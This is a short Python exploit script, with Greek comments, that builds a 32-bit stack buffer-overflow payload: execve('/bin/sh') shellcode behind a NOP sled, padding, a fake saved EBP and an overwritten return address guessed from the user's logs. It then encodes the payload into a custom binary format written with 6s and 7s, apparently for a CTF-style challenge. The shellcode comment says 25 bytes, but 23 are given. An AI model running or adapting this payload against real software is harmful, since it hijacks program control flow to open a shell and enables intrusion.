import sys

def encode_67(b_arr):
    res = ""
    for b in b_arr:
        res += format(b, '08b').replace('0', '6').replace('1', '7')
    return res

# 1. Shellcode (παράδειγμα execve /bin/sh - 25 bytes)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# 2. Φτιάξε τον Buffer (121 bytes)
# 80 NOPs + Shellcode + Padding
buffer = b"\x90" * 80 + shellcode
buffer += b"A" * (121 - len(buffer))

# 3. Saved EBP (4 bytes)
ebp = b"BBBB"

# 4. Saved EIP (Η διεύθυνση που "μαντεύουμε")
# Με βάση τα logs σου, το 0xffffaf80 είναι μια εξαιρετική μαντεψιά
eip = b"\x80\xaf\xff\xff" 

full_payload = buffer + ebp + eip
print(encode_67(full_payload))